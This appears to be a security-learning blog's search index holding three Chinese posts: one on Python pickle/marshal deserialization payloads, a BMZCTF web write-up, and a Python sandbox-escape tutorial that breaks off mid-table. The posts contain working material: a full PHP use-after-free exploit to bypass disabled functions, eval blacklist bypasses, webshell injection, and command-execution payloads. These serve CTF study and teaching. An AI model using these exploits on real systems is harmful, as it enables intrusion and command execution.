{"pages":[{"title":"About","date":"2020-09-26T13:03:31.662Z","path":"about/index.html","text":"Ca01h 南京邮电大学在读研究生 Web安全学习ing… 联系方式：NTExOTY1NzM4QHFxLmNvbQ=="},{"title":"Categories","date":"2020-09-26T13:03:31.664Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2020-09-26T13:03:31.667Z","path":"tags/index.html","text":""}],"posts":[{"title":"Python反序列化漏洞","date":"2021-01-03T13:19:56.000Z","path":"Web_security/basic_learning/30.Python反序列化漏洞/","text":"Python反序列化漏洞 这是关于Python语言相关漏洞的第三篇：反序列化漏洞。学过PHP反序列化漏洞之后，肯定知道关于PHP反序列化各式各样的利用方式，比如POP链构造，Phar反序列化，原生类反序列化以及字符逃逸等等，Python相对而言没有PHP那么灵活，关于反序列化漏洞的话比较容易理解，主要涉及这么几个概念：pickle，pvm，__reduce__魔术方法。 K0rz3n师傅的文章已经讲的极为透彻了，我就搬运总结学习一下。 0x01 python序列化和反序列化 序列化 1234567891011import pickleclass People(object): def __init__(self,name = &quot;K0rz3n&quot;): self.name = name def say(self): print &quot;Hello ! My friends&quot;a=People()c=pickle.dumps(a)print c python3的输出： python2的输出： 虽然看起来有点难理解，但是还是可以清楚地看到我们对象的属性 name ca01h，我们对象所属的类 people 都已近存储在里面了。 反序列化 123456789101112import pickleclass People(object): def __init__(self,name = &quot;K0rz3n&quot;): self.name = name def say(self): print &quot;Hello ! My friends&quot;a=People()c=pickle.dumps(a)d = pickle.loads(c)d.say() 无论python2还是python3，输出的都是Hello ! My friends，也就是说我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法。 0x02 反序列化漏洞 漏洞常见出现地方 1.通常在解析认证token，session的时候 现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。 2.可能将对象Pickle后存储成磁盘文件。 3.可能将对象Pickle后在网络中传输。 其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的。 漏洞利用方式 漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。 简单说明一下__reduce__()函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。 show code 123456789import pickleimport osclass A(object): def __reduce__(self): a = &#x27;/bin/sh&#x27; return (os.system,(a,))a = A()test = pickle.dumps(a)print test 运行结果： 稍微解释一下这几个指令： S : 后面跟的是字符串 ( ：作为命令执行到哪里的一个标记 t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中 c ：定义模块名和类名（模块名和类名之间使用回车分隔） R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中 . ：点号是结束符 另外p0 p1 p2 p3只是标签，对命令我们的payload没有任何影响。 我们让上面这个结果进行反序列化看一下结果 123456789import pickleimport osclass A(object): def __reduce__(self): a = &#x27;/bin/sh&#x27; return (os.system,(a,))a = A()test = pickle.dumps(a)pickle.loads(test) 运行结果： 再来看一个最简单的利用方式。 123456789101112131415import pickleimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index(): try: user = base64.b64decode(request.cookies.get(&#x27;user&#x27;)) user = pickle.loads(user) username = user[&quot;username&quot;] except: username = &quot;Guest&quot; return &quot;Hello %s&quot; % usernameif __name__ == &quot;__main__&quot;: app.run() 很明显，反序列化的参数是可控的。 123456class exp(object): def __reduce__(self): return (os.system,(&#x27;whoami&#x27;,)) e = exp()s = pickle.dumps(e) 0x03 Marshal反序列化 现在看看还有啥别的序列化库。由于pickle不能序列化code对象，所以在python2.6后新增marshal来处理code对象的序列化。 12345678910111213141516import pickle,builtins,pickletools,base64import marshalimport urllibdef foo(): import os def fib(n): if n &lt;= 2: return n return fib(n-1) + fib(n-2) print (fib(5))try: pickle.dumps(foo.__code__)except Exception as e: print(e)code_serialized = base64.b64encode(marshal.dumps(foo.__code__))print(code_serialized) 运行结果： 好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 __reduce__ 呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，这个时候就需要自己构造opcode。 这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数： 123456789101112131415161718import pickle,builtins,pickletools,base64import marshalimport urllibdef foo(): import os def fib(n): if n &lt;= 2: return n return fib(n-1) + fib(n-2) print (fib(5))try: pickle.dumps(foo.__code__)except Exception as e: print(e)code_serialized = base64.b64encode(marshal.dumps(foo.__code__))code_unserialized = marshal.loads(base64.b64decode(code_serialized))code_unserialized = types.FunctionType(code_unserialized, globals(), &#x27;&#x27;)()print(code_unserialized) 那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行 1234567891011ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;YwAAA...&#39; #code对象序列化编码tRtRc__builtin__globals(tRS&#39;&#39;tR(tR. 利用方式 12345def foo(): import os return os.system(&#x27;whoami&#x27;)code_serialized = base64.b64encode(marshal.dumps(foo()))print(code_serialized) 执行结果： 在pickle下尝试执行： 12345678910111213payload = b&quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#x27;6QAAAAA=&#x27; #whomaitRtRc__builtin__globals(tRS&#x27;&#x27;tR(tR.&quot;&quot;&quot;data = pickle.loads(payload)print(data) 于是又有一个黑名单绕过执行函数的方式。 0x04 Others 当然还有一些其他的反序列化方式，例如PyYaml，Jsonpickle，Shelve，这里就不多赘述了。 https://misakikata.github.io/2020/04/python-反序列化/","tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"反序列化","slug":"反序列化","permalink":"http://ca0y1h.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"Web基础安全学习","slug":"Web基础安全学习","permalink":"http://ca0y1h.top/categories/Web%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"BMZCTF2020-Web-WriteUp","date":"2021-01-03T09:12:56.000Z","path":"Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp/","text":"BMZCTF2020 Web WriteUp 0x01 easyeval 123456789&lt;?phphighlight_file(__FILE__);$cmd=$_POST[&#x27;cmd&#x27;];$cmd=htmlspecialchars($cmd);$black_list=array(&#x27;php&#x27;,&#x27;echo&#x27;,&#x27;`&#x27;,&#x27;preg&#x27;,&#x27;server&#x27;,&#x27;chr&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;file&#x27;,&#x27;session&#x27;,&#x27;ascii&#x27;,&#x27;eval&#x27;,&#x27;replace&#x27;,&#x27;assert&#x27;,&#x27;exec&#x27;,&#x27;cookie&#x27;,&#x27;$&#x27;,&#x27;include&#x27;,&#x27;var&#x27;,&#x27;print&#x27;,&#x27;scan&#x27;,&#x27;decode&#x27;,&#x27;system&#x27;,&#x27;func&#x27;,&#x27;ini_&#x27;,&#x27;passthru&#x27;,&#x27;pcntl&#x27;,&#x27;open&#x27;,&#x27;link&#x27;,&#x27;log&#x27;,&#x27;current&#x27;,&#x27;local&#x27;,&#x27;source&#x27;,&#x27;require&#x27;,&#x27;contents&#x27;);$cmd = str_ireplace($black_list,&quot;BMZCTF&quot;,$cmd);eval($cmd);?&gt; 拼接绕过 1cmd&#x3D;(&#39;s&#39;.&#39;y&#39;.&#39;s&#39;.&#39;t&#39;.&#39;e&#39;.&#39;m&#39;)(&quot;cat &#x2F;flag&quot;); 十六进制绕过 1cmd&#x3D;hex2bin(&#39;73797374656d&#39;)(&#39;cat &#x2F;flag&#39;); 异或 12345678910111213141516import stringchar = string.printablecmd = &#x27;system&#x27;tmp1,tmp2 = &#x27;&#x27;,&#x27;&#x27;for res in cmd: for i in char: for j in char: if(ord(i)^ord(j) == ord(res)): tmp1 += i tmp2 += j break else: continue breakprint(tmp1,tmp2) 取反 1234567891011121314&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,&#x27;[+]your function: &#x27;);$system=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#x27;[+]your command: &#x27;);$command=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;; 0x02 easyphp 12345678&lt;?php highlight_file(__FILE__);$cmd=$_POST[&#x27;a&#x27;];if(strlen($cmd) &gt; 25)&#123; die();&#125;else&#123; eval($cmd);&#125; 先看一下phpinfo的内容，PHP版本7.3，禁掉了很多函数。 蚁剑的绕过方式都失败了，参考脚本https://xz.aliyun.com/t/8355 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182&lt;?phperror_reporting(0);$a = str_repeat(&quot;T&quot;, 120 * 1024 * 1024);function i2s(&amp;$a, $p, $i, $x = 8) &#123; for($j = 0;$j &lt; $x;$j++) &#123; $a[$p + $j] = chr($i &amp; 0xff); $i &gt;&gt;= 8; &#125;&#125;function s2i($s) &#123; $result = 0; for ($x = 0;$x &lt; strlen($s);$x++) &#123; $result &lt;&lt;= 8; $result |= ord($s[$x]); &#125; return $result;&#125;function leak(&amp;$a, $address) &#123; global $s; i2s($a, 0x00, $address - 0x10); return strlen($s -&gt; current());&#125;function getPHPChunk($maps) &#123; $pattern = &#x27;/([0-9a-f]+\\-[0-9a-f]+) rw\\-p 00000000 00:00 0 /&#x27;; preg_match_all($pattern, $maps, $match); foreach ($match[1] as $value) &#123; list($start, $end) = explode(&quot;-&quot;, $value); if (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) &gt;= 0x200000 &amp;&amp; $length &lt;= 0x300000) &#123; $address = array(s2i(hex2bin($start)), s2i(hex2bin($end)), $length); echo &quot;[+]PHP Chunk: &quot; . $start . &quot; - &quot; . $end . &quot;, length: 0x&quot; . dechex($length) . &quot;\\n&quot;; return $address; &#125; &#125;&#125;function bomb1(&amp;$a) &#123; if (leak($a, s2i($_GET[&quot;test1&quot;])) === 0x5454545454545454) &#123; return (s2i($_GET[&quot;test1&quot;]) &amp; 0x7ffff0000000); &#125;else &#123; die(&quot;[!]Where is here&quot;); &#125;&#125;function bomb2(&amp;$a) &#123; $start = s2i($_GET[&quot;test2&quot;]); return getElement($a, array($start, $start + 0x200000, 0x200000)); die(&quot;[!]Not Found&quot;);&#125;function getElement(&amp;$a, $address) &#123; for ($x = 0;$x &lt; ($address[2] / 0x1000 - 2);$x++) &#123; $addr = 0x108 + $address[0] + 0x1000 * $x + 0x1000; for ($y = 0;$y &lt; 5;$y++) &#123; if (leak($a, $addr + $y * 0x08) === 0x1234567812345678 &amp;&amp; ((leak($a, $addr + $y * 0x08 - 0x08) &amp; 0xffffffff) === 0x01))&#123; echo &quot;[+]SplDoublyLinkedList Element: &quot; . dechex($addr + $y * 0x08 - 0x18) . &quot;\\n&quot;; return $addr + $y * 0x08 - 0x18; &#125; &#125; &#125;&#125;function getClosureChunk(&amp;$a, $address) &#123; do &#123; $address = leak($a, $address); &#125;while(leak($a, $address) !== 0x00); echo &quot;[+]Closure Chunk: &quot; . dechex($address) . &quot;\\n&quot;; return $address;&#125;function getSystem(&amp;$a, $address) &#123; $start = $address &amp; 0xffffffffffff0000; $lowestAddr = ($address &amp; 0x0000fffffff00000) - 0x0000000001000000; for($i = 0; $i &lt; 0x1000 * 0x80; $i++) &#123; $addr = $start - $i * 0x20; if ($addr &lt; $lowestAddr) &#123; break; &#125; $nameAddr = leak($a, $addr); if ($nameAddr &gt; $address || $nameAddr &lt; $lowestAddr) &#123; continue; &#125; $name = dechex(leak($a, $nameAddr)); $name = str_pad($name, 16, &quot;0&quot;, STR_PAD_LEFT); $name = strrev(hex2bin($name)); $name = explode(&quot;\\x00&quot;, $name)[0]; if($name === &quot;system&quot;) &#123; return leak($a, $addr + 0x08); &#125; &#125;&#125;class Trigger &#123; function __destruct() &#123; global $s; unset($s[0]); $a = str_shuffle(str_repeat(&quot;T&quot;, 0xf)); i2s($a, 0x00, 0x1234567812345678); i2s($a, 0x08, 0x04, 7); $s -&gt; current(); $s -&gt; next(); if ($s -&gt; current() !== 0x1234567812345678) &#123; die(&quot;[!]UAF Failed&quot;); &#125; $maps = file_get_contents(&quot;/proc/self/maps&quot;); if (!$maps) &#123; cantRead($a); &#125;else &#123; canRead($maps, $a); &#125; echo &quot;[+]Done&quot;; &#125;&#125;function bypass($elementAddress, &amp;$a) &#123; global $s; if (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) &#123; die(&quot;[!]Get Closure Chunk Address Failed&quot;); &#125; $closure_object = leak($a, $closureChunkAddress + 0x18); echo &quot;[+]Closure Object: &quot; . dechex($closure_object) . &quot;\\n&quot;; $closure_handlers = leak($a, $closure_object + 0x18); echo &quot;[+]Closure Handler: &quot; . dechex($closure_handlers) . &quot;\\n&quot;; if(!($system_address = getSystem($a, $closure_handlers))) &#123; die(&quot;[!]Couldn&#x27;t determine system address&quot;); &#125; echo &quot;[+]Find system&#x27;s handler: &quot; . dechex($system_address) . &quot;\\n&quot;; i2s($a, 0x08, 0x506, 7); for ($i = 0;$i &lt; (0x130 / 0x08);$i++) &#123; $data = leak($a, $closure_object + 0x08 * $i); i2s($a, 0x00, $closure_object + 0x30); i2s($s -&gt; current(), 0x08 * $i + 0x100, $data); &#125; i2s($a, 0x00, $closure_object + 0x30); i2s($s -&gt; current(), 0x20, $system_address); i2s($a, 0x00, $closure_object); i2s($a, 0x08, 0x108, 7); echo &quot;[+]Executing command: \\n&quot;; ($s -&gt; current())(&quot;/readflag&quot;);&#125;function canRead($maps, &amp;$a) &#123; global $s; if (!$chunkAddress = getPHPChunk($maps)) &#123; die(&quot;[!]Get PHP Chunk Address Failed&quot;); &#125; i2s($a, 0x08, 0x06, 7); if (!$elementAddress = getElement($a, $chunkAddress)) &#123; die(&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;); &#125; bypass($elementAddress, $a);&#125;function cantRead(&amp;$a) &#123; global $s; i2s($a, 0x08, 0x06, 7); if (!isset($_GET[&quot;test1&quot;]) &amp;&amp; !isset($_GET[&quot;test2&quot;])) &#123; die(&quot;[!]Please try to get address of PHP Chunk&quot;); &#125; if (isset($_GET[&quot;test1&quot;])) &#123; die(dechex(bomb1($a))); &#125; if (isset($_GET[&quot;test2&quot;])) &#123; $elementAddress = bomb2($a); &#125; if (!$elementAddress) &#123; die(&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;); &#125; bypass($elementAddress, $a);&#125;$s = new SplDoublyLinkedList();$s -&gt; push(new Trigger());$s -&gt; push(&quot;Twings&quot;);$s -&gt; push(function($x)&#123;&#125;);for ($x = 0;$x &lt; 0x100;$x++) &#123; $s -&gt; push(0x1234567812345678);&#125;$s -&gt; rewind();unset($s[0]); 先用蚁剑连接： 再上传至/tmp目录下： include包含exp.php 0x03 penetration 12345678910111213141516171819202122&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; $_=array(&#x27;b&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;-&#x27;,&#x27;q&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;i&#x27;,&#x27;p&#x27;,&#x27;j&#x27;,&#x27;+&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;o&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;\\~&#x27;,&#x27;\\:&#x27;,&#x27;\\^&#x27;,&#x27;\\@&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\%&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\*&#x27;,&#x27;\\(&#x27;,&#x27;\\)&#x27;,&#x27;\\!&#x27;,&#x27;\\=&#x27;,&#x27;\\.&#x27;,&#x27;\\[&#x27;,&#x27;\\]&#x27;,&#x27;\\&#125;&#x27;,&#x27;\\&#123;&#x27;,&#x27;\\_&#x27;); $blacklist = array_merge($_); foreach ($blacklist as $blacklisted) &#123; if (strlen($ip) &lt;= 18)&#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $ip)) &#123; die(&#x27;nonono&#x27;); &#125;else&#123; exec($ip); &#125; &#125; else&#123; die(&quot;long&quot;); &#125; &#125; &#125;?&gt; 过滤之后还剩下这些字符可以使用: 1# $ , &#x2F; ; ? \\ &#96; | a c h l r s t u v y z 0 1 2 3 4 5 6 7 8 9 由于exec没有回显，应该要使用反弹shell，但是有字数长度限制，这里需要用curl命令读取远程文件绕过一下，而且要把ip地址转换成十进制表示，不知道是我的阿里云站点配置有问题还是怎么回事，我用curl命令+ip地址返回200，但是curl+十进制ip地址就直接给我返回301了，但是我看了宝塔的配置，也没有启用301重定向。 有知道原因的时候师傅可以告知我一下。 0x04 BMZ_Market 综合渗透类型，有点像HackTheBox。 首先进行信息搜集，查看源代码： robots.txt 一共搜集到两个地方，参数lang和robots.txt 参数lang存在文件包含漏洞，使用伪协议可以读取源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?php$password =&quot;Nevergiveup135.&quot; ;//I have to remember itif (isset($_GET[&#x27;lang&#x27;]))&#123;include($_GET[&#x27;lang&#x27;].&quot;.php&quot;);&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt; &lt;meta name=&quot;description&quot; content=&quot;BMZ Market&quot;&gt; &lt;meta name=&quot;author&quot; content=&quot;bmz&quot;&gt; &lt;title&gt;BMZ Market&lt;/title&gt; &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;covers.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt; &lt;body class=&quot;text-center&quot;&gt; &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt; &lt;header class=&quot;masthead mb-auto&quot;&gt; &lt;div class=&quot;inner&quot;&gt; &lt;h3 class=&quot;masthead-brand&quot;&gt;BMZ Market&lt;/h3&gt; &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt; &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt; &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt; &lt;/nav&gt; &lt;/div&gt; &lt;/header&gt; &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt; &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt; &lt;p class=&quot;lead&quot;&gt; &lt;?php if (isset($_GET[&#x27;lang&#x27;])) &#123; echo $message; &#125; else &#123; ?&gt; Believe in yourself, you can find the flag &lt;?php &#125;?&gt; &lt;/p&gt; &lt;p class=&quot;lead&quot;&gt; &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;more&lt;/a&gt; &lt;/p&gt; &lt;/main&gt; &lt;footer class=&quot;mastfoot mt-auto&quot;&gt; &lt;div class=&quot;inner&quot;&gt; &lt;p&gt;Power by&lt;a href=&quot;#&quot;&gt;@kuaile&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;/footer&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 有一个密码硬编码的地方：Nevergiveup135.，用户名可能是kuaile robots.txt拿去base64 decode： 发现是颜文字，可以直接拿到浏览器的console界面执行 又给了一个信息：Challenger, the background of the website is -.../--/--../.-/-../--/../-. 后面是一个摩斯编码，解码后的结果是:BMZADMIN，看样子应该是一个后台管理界面，用上面得到的用户名和密码登录进入后台。 可以看到当前的CMS版本是1.3.7，Google已知的利用方式：https://wiki.96.mk/Web安全/Eyoucms/Eyoucms 1.3.9 上传漏洞/ 这种利用方式好像打不通，参考mochu师傅的wp 抓包修改参数： 1&amp;scene&#x3D;bbb\\&#39;,$&#123;eval($_POST[mochu7])&#125;,&#x2F;&#x2F; 蚁剑连接，sudo -l发现可以无限制执行root命令： 再回头来看看后台上传文件RCE失效的原因： 可能是作者把解压的类文件给删掉了。 来大概跟一下这个漏洞，文件位置在application/admin/controllor/Weapp.php 由于过滤不严，直接把payload写到config.php文件当中： 然后在core/library/think/App.php中包含了config.php","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"Python沙箱逃逸","date":"2021-01-03T02:53:44.000Z","path":"Web_security/basic_learning/29.Python沙箱逃逸/","text":"Python沙箱逃逸 上一篇写到了关于python flask SSTI的总结文章，看了沙箱逃逸之后，发现这两者的方法和payload很相似，所以把python的沙箱逃逸和服务端模板注入放在一起总结。 0x01 基础知识 沙箱：沙箱是一种按照安全策略限制程序行为的执行环境。 沙箱逃逸：就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。 先来给上一道例题源码： 123456789101112131415161718192021222324#!/usr/bin/env pythonfrom __future__ import print_functionprint(&quot;Welcome to my Python sandbox! Enter commands below!&quot;)banned = [&quot;import&quot;, &quot;exec&quot;, &quot;eval&quot;, &quot;pickle&quot;, &quot;os&quot;, &quot;subprocess&quot;, &quot;kevin sucks&quot;, &quot;input&quot;, &quot;banned&quot;, &quot;cry sum more&quot;, &quot;sys&quot;]targets = __builtins__.__dict__.keys()targets.remove(&#x27;raw_input&#x27;)targets.remove(&#x27;print&#x27;)for x in targets: del __builtins__.__dict__[x]while 1: print(&quot;&gt;&gt;&gt;&quot;, end=&#x27; &#x27;) data = input() for no in banned: if no.lower() in data.lower(): print(&quot;No bueno&quot;) break else: # this means nobreak exec(data) 一般而言沙箱逃逸的题目考到的知识点无非下面5个： python的导包 python执行代码和命令 python文件读取 内置模块 对象创建于引用 那么与之相对应的解题思路大致分为5步： 测试能否导包 哪些系统包做了限制 内置函数是否可用 静态检测or动态检测 对象之间的引用关系索引 0x02 花式导包 如果我们想在沙箱中getshell的话，必不可少的是要引入Python中执行命令的包，例如os,sys,subprocess等。 有些沙箱使用比较初级的办法，通过正则对输入代码内容进行过滤，如下所示： 1234567import recode = open(&#x27;code.py&#x27;).read()pattern = re.compile(&#x27;import\\s+(os|commands|subprocess|sys)&#x27;)match = re.search(pattern,code)if match: print &quot;forbidden module import detected&quot; raise Exception 这个时候，我们突破这种封锁，首先要学习的是Python的各种导包方法。 初阶 一般比较常见的是以下几种方法： import xxx from xxx import * _import_(“xxx”) importlib库 imp 库 reload(xxx) 第一个和第二个比较熟悉，不用过多赘述，__import__作为一个函数，只能接受字符串参数，返回值可以直接用来操作，通常在动态加载的时候使用这个函数，python2和python3通用： importlib模块是对import和__import__的补充，它也可以通过传入字符串来引入一个模块，python2和python3使用方法一样： imp库的使用方法： reload 的用法比较有意思，假如沙箱导入了os模块，但是删除了system方法,强行使用system执行命令会报错: 而我又想用system方法执行命令的话，可以使用reload重新加载os模块，恢复对system方法的引用。 高阶 导包说到本质上其实是python 读取指定包的py文件，并将其加载到解释器的过程。在模块导入的时候，默认在当前目录下查找，然后再在系统中查找，系统查找的范围是sys.path下的所有路径。 我使用的是Anaconda管理python版本，在一些常见的Linux发行版本上，路径一般都是在/usr/lib/python3.X目录下。 因此我们可以直接执行对应包的文件，从而实现包的导入。在py2中有execfile这个函数： 在python3中没有execfile这个函数，但是又exec，可以通过读文件交给exec执行的方式导入包： 上面说到导包的本质是python读取指定的文件，import的本质是：搜索modules并绑定到局部变量 import module_name实质是将module_name.py中的全部代码加载到内存并赋值给与模块同名的变量写在当前文件中，这个变量的类型是module 现在设置一下modules中os的值为None： 发现把os从modules中删去就不能直接引入了。但是，我们可以接着设置os的模块的路径，从而引入该模块： 另外，我们将 sys.modules 中的os 删除即可，这样import 发现 sys.modules没有os这个模块，就会重新创建。 0x03 执行代码和命令 动态执行代码 (1) eval/exec/execfile 在上文中，已经讲解了exec/execfile的用法。这里再总结一下： exec(source)：动态执行复杂的python代码，函数的返回值永远为None。 execfile(filename)：执行一个py文件的内容。 eval用来执行简单的python表达式返回表达式的结果，示例如下： 1eval(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;) (2) pickle 序列化 123456789import pickleclass A(object): def __reduce__(self): import os return (os.system, (&#x27;whoami&#x27;,)) admin = A() B = pickle.dumps(admin) print(pickle.dumps(admin))# cnt\\nsystem\\np0\\n(S&#x27;whoami&#x27;\\np1\\ntp2\\nRp3\\n. 保存序列化之后的字符串，然后通过pickle.loads加载即可完成代码的执行。 12import picklepickle.loads(&quot;cnt\\nsystem\\np0\\n(S&#x27;whoami&#x27;\\np1\\ntp2\\nRp3\\n.&quot;) (3) timeit 这个模块是用来测试代码的执行时间的，可以动态执行代码，代码是字符串形式。 12import timeittimeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;,number=1) 执行命令 (1) os模块 可以通过os.system(cmd),os.popen(cmd)调用系统命令，例如: 12os.system(&quot;whoami&quot;)os.popen(&#x27;whoami&#x27;) (2) commands 模块 12print(commands.getoutput(&#x27;whoami&#x27;))print(commands.getstatusoutput(&#x27;whoami&#x27;)) (3) subprocess模块 subprocess模块是相对比较复杂的，有很多执行命令的函数： subprocess.run() Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。 subprocess.call() 执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。 subprocess.check_call() Python 2.5中新增的函数。执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。 subprocess.check_output() Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。 subprocess.getoutput(cmd) 接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。 subprocess.getstatusoutput(cmd) 执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)，其功能类似于commands.getstatusoutput()。 (4) platform 模块 可以调用platform 模块 中的 popen 这个函数执行命令。 123import platformprint(platform.popen(&#x27;ls&#x27;,mode=&#x27;r&#x27;,bufsize= -1).read())platform.os.system(&quot;ls&quot;) (5) pty 模块 pty模块可以生成一个伪终端，可以简单理解为bash，因此是可以执行命令的。 12import ptypty.spawn(&#x27;ls&#x27;)pty.os.system(&quot;ls&quot;) (6) cgi 模块 12import cgicgi.os.system(&quot;ls&quot;) 0x04 文件读取 初阶 (1)open（python2，python3） 1open(__file__).read() (2)file（python2） 1file(__file__).read() 高阶 (1)codecs模块（python2，python3） 12import codecscodecs.open(__file__).read() (2)types模块（python2） 12import typestypes.FileType(__file__,&#x27;r&#x27;).read() (3)os.open（python2，python3） 123import osfd = os.open(__file__, os.O_RDONLY)print(os.read(fd, 1024)) (4)file协议 python2 12import urllibu = urllib.urlopen(&#x27;file:///&#x27;+__file__) python3 123import urllibu = urllib.request.urlopen(&#x27;file:///&#x27;+__file__)print(u.read()) (5)fileinput模块 1234import fileinputwith fileinput.input(files=(__file__,)) as f: for line in f: print(line) 0x05 内建模块 如果沙箱不让我们导入外部模块，或者是要导入的模块被禁用，那我们只能求助于Python的内部模块__builtins__( 即Python 本身默认已经导入模块中的函数)。 dir内置函数可以列出一个模块/类/对象下面所有的属性和函数，查看一下__builtins__中的函数： 例如，我们可以引用__import__ 来导入os，并执行命令： 由于内置模块中的危险函数过多，比如eval,exec等，导致上文使用的沙箱对*****builtins*****进行了处理，通过 del 关键字将里面的所有函数引用都删除了。 如果保留reload内置函数，我们还可以通过 reload( __builtins__) 恢复，但是现在通过__builtins__来进行逃逸已经不现实了。 0x06 对象创建与引用 删除的是只是函数引用，而不是函数本身，如果你们熟悉C语言的话，函数引用可以理解为函数指针，既然__builtins__中的引用没了，那我们就需要从其他地方找到敏感函数的引用，从而实现逃逸。 关于这一块的内容，其实和flask SSTI的内容是一样的，也是通过python的内置类型的继承链来寻找更多的引用，以下字段是寻找继承链的关键： 名称 介绍 __dict__ 这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性 __class__ 返回一个实例对应的类型 __base__ 返回一个类所继承的基类 __subclasses__() 